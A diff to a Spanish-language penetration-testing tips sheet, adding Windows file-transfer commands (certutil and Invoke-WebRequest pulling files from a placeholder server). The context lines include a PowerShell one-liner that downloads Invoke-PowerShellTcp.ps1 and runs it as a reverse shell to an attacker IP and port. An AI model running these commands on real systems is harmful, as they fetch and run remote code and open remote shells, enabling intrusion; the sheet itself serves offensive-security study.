@@ -717,6 +717,14 @@ Ahora el ultimo paso es inyectar el comando de powershell para entablar la conex
 powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
 ```
 ## Tip #19: Transferencia de archivos en Windows
+### CMD
+```bash
+C:\Users> certutil -urlcache -f http://<tu-servidor-web>/archivo.txt archivo.txt
+```
+### Powershell
+```powershell
+PS C:\Users> Invoke-WebRequest "http://<tu-servidor-web>/archivo.txt" -OutFile "C:\Users\archivo.txt"
+```
 ## Tip #20: Transferencia de archivos en Linux
 ### Mediante servidor web
 Para transferir archivos a una maquina remota primero debemos ubicarnos en el directorio donde esta ubicado el archivo a transferir y luego inicamos un servidor web mediante python3:
